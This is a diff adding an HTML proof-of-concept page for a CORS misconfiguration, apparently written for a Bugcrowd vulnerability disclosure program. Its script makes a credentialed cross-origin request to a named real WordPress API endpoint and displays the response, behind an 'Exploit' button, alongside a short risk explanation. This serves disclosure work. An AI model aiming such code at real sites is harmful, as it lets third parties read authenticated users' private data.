@@ -1,0 +1,53 @@
+<!DOCTYPE HTML>
+<html>
+        <head>
+                <title>CORS POC</title>
+                <script>
+                        function cors(){
+                                var xhttp = new XMLHttpRequest();
+                                        xhttp.onreadystatechange = function(){
+                                                if (this.readyState == 4 && this.status == 200){
+                                                        document.getElementById("demo").innerHTML = alert(this.responseText);
+                                                }
+                                        }
+                                        xhttp.open("GET", "https://intendia.com/wp-json/wp/v2/pages/390", true);
+                                        xhttp.withCredentials = true;
+                                        xhttp.send();
+                        }
+                </script>
+                <style type="text/css">
+                        .button {
+                                background-color: black;
+                                border: 3 px solid seagreen;
+                                color: white;
+                                padding: 15px 32px;
+                                text-align: center;
+                                transition-duration: 0.4s;
+                                text-decoration: none;
+                                display: inline-block;
+                                font-size: 20px;
+                                border-radius: 50%;
+                        }
+                        .button:hover {
+                                background-color: aquamarine;
+                                color: red;
+                        }
+
+                </style>
+        </head>
+        <body style="background-color: aquamarine;">
+                <center>
+                        <h1>CORS POC by Nandheswara</h1>
+                        <h3>Click on Exploit Button</h3>
+                        <div id="demo">
+                                <button class="button" type="button" onclick="cors()">Exploit</button>
+                        </div>
+                        <br><br><br>
+                        <h2>Impact and Risk</h2>
+                        <marquee>A CORS misconfiguration can leave the application at a high-risk of compromise resulting in an impact on the confidentiality and integrity of data by allowing third-party sites to carry out privileged requests through your web site’s authenticated users such as retrieving user setting information or saved payment card data.On the other hand, the risk is low for applications that deal with public data and require that resources are sent to other origins. The configuration could be expected behaviour and it would need to be up to the penetration tester to identify the appropriate risk and the organization to understand and mitigate, or accept the risk.</marquee>
+                        <br><br><br><br><br><br><br><br><br>
+                        <h2>Bugcrowd Program Name: Geotab: VDP </h2>
+                        <h3>Affeceted URL: https://intendia.com/wp-json/wp/v2/pages/390</h3>
+                </center>
+        </body>
+</html>
